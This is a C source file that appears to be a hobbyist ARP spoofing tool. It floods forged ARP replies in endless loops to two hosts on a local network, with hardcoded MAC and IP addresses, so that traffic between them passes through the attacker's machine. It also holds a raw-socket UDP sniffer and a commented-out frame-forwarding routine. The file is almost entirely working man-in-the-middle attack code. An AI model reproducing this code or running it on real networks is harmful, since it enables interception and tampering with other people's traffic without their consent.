#include<time.h>
#include<stdio.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<string.h>
#include<sys/select.h>
#include<pthread.h>
#include<signal.h>
#include<stdlib.h>
#include<fcntl.h>
#include<sys/shm.h>
#include<unistd.h>
#include<sys/un.h>
#include<netinet/ip.h>
#include<arpa/inet.h>
#include<pcap.h>
#include<errno.h>
//#include<netinet/if_ether.h>
#include<net/ethernet.h>
//#include<netinet/ether.h>
#include<netinet/udp.h>
#include<sys/ipc.h>
#include<sys/msg.h>

#include<stdio.h>	//for printf
#include<string.h> //memset
#include<sys/socket.h>//for socket ofcourse
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/udp.h>	//Provides declarations for udp header
#include<netinet/ip.h>//Provides declarations for ip header

#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h> /* the L2 protocols */
#include <net/if.h>
struct arphdr
{
        uint16_t htype;		//Hardware type
        uint16_t ptype;		//Protocol type
        uint8_t hlen;		//Hardware address length
        uint8_t plen;		//Protocol address length
  	uint16_t opcode;	//Operation code
        uint8_t sender_mac[6];  
        uint8_t sender_ip[4];
        uint8_t target_mac[6];
	uint8_t target_ip[4]; 

/*
    #define    ARPOP_REQUEST	1	// request to resolve address 
    #define    ARPOP_REPLY	2	// response to previous request 
    #define    ARPOP_REVREQUEST 3	// request protocol address given hardware
    #define    ARPOP_REVREPLY	4	// response giving protocol address 
    #define    ARPOP_INVREQUEST 8 	// request to identify peer 
    #define    ARPOP_INVREPLY	9	// response identifying peer 
*/

};

void* pcap_send_arp(void* argv)
{

	int BtoA = *(int*)argv;
	int sfd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	char  interface[40];
	strcpy (interface, "wlp3s0");
	if(sfd==-1)
	{
		perror("socket");
	}
	printf("Got BtoA as :%d\n",BtoA);
	
	char* buf = (char*)malloc(1500);
	uint8_t src[6],dst[6];

	//B's mac address
	src[0] = 0x44;
	src[1] = 0x1C;
	src[2] = 0xA8;
	src[3] = 0xA6;
	src[4] = 0xEF;
	src[5] = 0x9B;

	if(BtoA)
	{
	//A's mac address
	dst[0] = 0x3C;
	dst[1] = 0x95;
	dst[2] = 0x09;
	dst[3] = 0xEE;
	dst[4] = 0xD6;
	dst[5] = 0x7D;
	}
	else
	{
	//C's mac address
	dst[0] = 0x00;
	dst[1] = 0xDB;
	dst[2] = 0xDF;
	dst[3] = 0xD1;
	dst[4] = 0xA3;
	dst[5] = 0xEE;

	}
	memcpy(buf,dst,6*(sizeof (uint8_t)));
	memcpy(buf+6*(sizeof (uint8_t)),src,6*(sizeof (uint8_t)));
	
	buf[12] = ETH_P_ARP / 256;
	buf[13] = ETH_P_ARP % 256;
	
	struct arphdr* arp = (struct arphdr*)(buf+14);
	arp->htype = htons(1);		//because we use ethernet
	arp->ptype = 8;	// ETH_P_IP = 0x0800 
	arp->hlen = 6;
	arp->plen = 4;
	arp->opcode = htons(2);		// ARP reply
	
	memcpy(arp->sender_mac ,src,6*(sizeof(uint8_t)));
	memcpy(arp->target_mac ,dst,6*(sizeof(uint8_t)));

	if(BtoA)
	{
	// C's IP
	arp->sender_ip[0] = 192;
	arp->sender_ip[1] = 168;
	arp->sender_ip[2] = 43;
	arp->sender_ip[3] = 16;
	
	//A's IP

	arp->target_ip[0] = 192;
	arp->target_ip[1] = 168;
	arp->target_ip[2] = 43;
	arp->target_ip[3] = 217;
	}
	else
	{
	// A's IP
	arp->sender_ip[0] = 192;
	arp->sender_ip[1] = 168;
	arp->sender_ip[2] = 43;
	arp->sender_ip[3] = 217;
	
	//C's IP

	arp->target_ip[0] = 192;
	arp->target_ip[1] = 168;
	arp->target_ip[2] = 43;
	arp->target_ip[3] = 16;
	}
	memcpy(buf+14,arp,28);
	
	int bytes;

	/*
        struct sockaddr_ll device;
        memset (&device, 0, sizeof (device));
	if ((device.sll_ifindex = if_nametoindex (interface)) == 0)
	{
		perror ("if_nametoindex() failed to obtain interface index ");
		exit (EXIT_FAILURE);
	}
	printf ("Index for interface %s is %i\n", interface, device.sll_ifindex);
        device.sll_family = AF_PACKET;
 	memcpy (device.sll_addr, dst, 6 * sizeof (uint8_t));
	device.sll_halen = 6;
				    
	while(1)	
        {
  	      if ((bytes = sendto (sfd, buf,42, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) 
	      {
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
	      }
        }
	*/
	
	char* device;
	char error[PCAP_ERRBUF_SIZE];
	/*device = pcap_lookupdev(error);
	if(device==NULL) 
	{
		printf("Could not find a device: %s",error);exit(0);
	}
	else
	{
		printf("Device: %s\n",device);
	}*/
	device = malloc(100);
	strcpy(device, "wlp3s0");
	pcap_t *handle;
	int timeout = 1000;
	handle = pcap_open_live(device,BUFSIZ,0,timeout,error);
	if(handle==NULL)
	{
		printf("Could not find a handle: %s",error);exit(0);
	}
	while(1)
	{
		if(pcap_inject(handle,buf,44)<=0)
		{
			perror("Could not send");
		}
	}
	
}

void PrintData (const u_char * data , int Size)
{
   FILE* logfile = stdout;
   //u_char *ptr=(u_char *)data;
 //  const char* S1 = reinterpret_cast<const char*>(data);
  // fprintf(logfile,"%s\n",S1);
    int i , j;
    for(i=0 ; i < Size ; i++)
    {
        if( i!=0 && i%16==0)   //if one line of hex printing is complete...
        {
            fprintf(logfile , "         ");
            for(j=i-16 ; j<i ; j++)
            {
                if(data[j]>=32 && data[j]<=128)
                    fprintf(logfile , "%c",(unsigned char)data[j]); //if its a number or alphabet
                 
                else fprintf(logfile , "."); //otherwise print a dot
            }
            fprintf(logfile , "\n");
        } 
         
        if(i%16==0) fprintf(logfile , "   ");
            fprintf(logfile , " %02X",(unsigned int)data[i]);
                 
        if( i==Size-1)  //print the last spaces
        {
            for(j=0;j<15-i%16;j++) 
            {
              fprintf(logfile , "   "); //extra spaces
            }
             
            fprintf(logfile , "         ");
             
            for(j=i-i%16 ; j<=i ; j++)
            {
                if(data[j]>=32 && data[j]<=128) 
                {
                  fprintf(logfile , "%c",(unsigned char)data[j]);
                }
                else
                {
                  fprintf(logfile , ".");
                }
            }
             
            fprintf(logfile ,  "\n" );
        }
    }
}

void print_ip_header(const u_char * Buffer, int Size)
{
    FILE* logfile = stdout;
    //print_ethernet_header(Buffer , Size);
   
    unsigned short iphdrlen;
         
    struct iphdr *iph = (struct iphdr *)(Buffer  + sizeof(struct ethhdr) );
    iphdrlen =iph->ihl*4;

    struct sockaddr_in source,dest;
     
    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = iph->saddr;
     
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = iph->daddr;
     
    fprintf(logfile , "\n");
    fprintf(logfile , "IP Header\n");
    fprintf(logfile , "   |-IP Version        : %d\n",(unsigned int)iph->version);
    fprintf(logfile , "   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
    fprintf(logfile , "   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
    fprintf(logfile , "   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
    fprintf(logfile , "   |-Identification    : %d\n",ntohs(iph->id));
    fprintf(logfile , "   |-TTL      : %d\n",(unsigned int)iph->ttl);
    fprintf(logfile , "   |-Protocol : %d\n",(unsigned int)iph->protocol);
    fprintf(logfile , "   |-Checksum : %d\n",ntohs(iph->check));
    fprintf(logfile , "   |-Source IP        : %s\n" , inet_ntoa(source.sin_addr) );
    fprintf(logfile , "   |-Destination IP   : %s\n" , inet_ntoa(dest.sin_addr) );
}
void print_udp_packet(const u_char *Buffer , int Size)
{
     FILE* logfile = stdout;
    unsigned short iphdrlen;
     
    struct iphdr *iph = (struct iphdr *)(Buffer +  sizeof(struct ethhdr));
    iphdrlen = iph->ihl*4;
     
    struct udphdr *udph = (struct udphdr*)(Buffer + iphdrlen  + sizeof(struct ethhdr));
     
    int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof udph;
     
    fprintf(logfile , "\n\n***********************UDP Packet*************************\n");
     
    //print_ip_header(Buffer,Size);           
     
    fprintf(logfile , "\nUDP Header\n");
    fprintf(logfile , "   |-Source Port      : %d\n" , ntohs(udph->source));
    fprintf(logfile , "   |-Destination Port : %d\n" , ntohs(udph->dest));
    fprintf(logfile , "   |-UDP Length       : %d\n" , ntohs(udph->len));
    fprintf(logfile , "   |-UDP Checksum     : %d\n" , ntohs(udph->check));
     
    fprintf(logfile , "\n");
    fprintf(logfile , "IP Header\n");
    PrintData(Buffer , iphdrlen);
         
    fprintf(logfile , "UDP Header\n");
    PrintData(Buffer+iphdrlen , sizeof udph);
         
    //fprintf(logfile , "Data Payload\n");    
     
    //Move the pointer ahead and reduce the size of string
    //PrintData(Buffer + header_size , Size - header_size);
     
    fprintf(logfile , "\n###########################################################");
}
void* pcap_recv_packs(void* args)
{
	/*
	int psfd = socket(PF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	
	while(1)
	{
		char buf[100];
		char interface[40];
		strcpy(interface, "wlp3s0");
		struct sockaddr_ll device;

		int bytes;
		int len = sizeof(device);
		if ((bytes = recvfrom (psfd, buf,100, 0, (struct sockaddr *) &device, &len)) <= 0) 
		{
			perror ("recvfrom() failed");
			exit (EXIT_FAILURE);
		}
		
	    struct ethhdr *eth = (struct ethhdr *)buf;
	     
	    FILE* logfile = stdout;
	 
	    fprintf(logfile , "Ethernet Header\n");
	    fprintf(logfile , "   |-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_dest[0] , eth->h_dest[1] , eth->h_dest[2] , eth->h_dest[3] , eth->h_dest[4] , eth->h_dest[5] );
	    fprintf(logfile , "   |-Source Address      : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n", eth->h_source[0] , eth->h_source[1] , eth->h_source[2] , eth->h_source[3] , eth->h_source[4] , eth->h_source[5] );
	    fprintf(logfile , "   |-Protocol            : %u \n",(unsigned short)eth->h_proto);

	
		//change to B's mac
		eth->h_source[0] = 0xEC;
		eth->h_source[1] = 0x8E;
		eth->h_source[2] = 0xB5;
		eth->h_source[3] = 0x0C;
		eth->h_source[4] = 0x28;
		eth->h_source[5] = 0x9E;
	


		if ((bytes = sendto (psfd, buf,42, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) 
	      {
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
	      }
	}
	*/


/*
	int sfd;
	struct sockaddr_in serv_addr;
	char buffer[256];

	bzero(&serv_addr,sizeof(serv_addr));

	if((sfd = socket(AF_INET , SOCK_DGRAM , 0))==-1)
	perror("\n socket");
	else printf("\n socket created successfully\n");

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(8000);
	serv_addr.sin_addr.s_addr = inet_addr("192.168.43.16");
	
	if(bind(sfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))<0)
	perror("BIND");
	
	socklen_t serv_len = sizeof(serv_addr);
	
//	fgets( buffer , 256 , stdin );
	recvfrom(sfd , buffer , 256 , 0 , ( struct sockaddr * ) &serv_addr , & serv_len );
	
	printf("IP received:%s\n", inet_ntoa(serv_addr.sin_addr));
	//sendto(sfd , buffer , 256 , 0 , ( struct sockaddr * ) &serv_addr ,  serv_len);

*/
	//if(argc<2)cout<<"Enter protocol in arguments\n";

	printf("Entered\n");
	int rsfd=socket(AF_INET,SOCK_RAW,IPPROTO_UDP);
	if(rsfd==-1)perror("socket");
	char buf[4096];

	struct sockaddr_in client;
	socklen_t clilen=sizeof(client);
	
	while(1)
	{
		
		recvfrom(rsfd,buf,4096,0,(struct sockaddr*)&client,(socklen_t*)&clilen);
		perror("recv");
		 struct iphdr *ip;
		 ip=(struct iphdr*)buf;
		print_udp_packet(buf, sizeof(buf));
	}
	

}


int main(int argc, char** argv)
{
	pthread_t t1, t2, t3;
	int BtoA = 1;
	pthread_create(&t1, NULL, &pcap_send_arp, (void*)&BtoA);
	int BtoC = 0;	
	pthread_create(&t2, NULL, &pcap_send_arp, (void*)&BtoC);
	
	//pthread_create(&t3, NULL, &pcap_recv_packs, NULL);
	
	pthread_join(t1, NULL);
	pthread_join(t2, NULL);
	//pthread_join(t3, NULL);
			
	return 0;
}
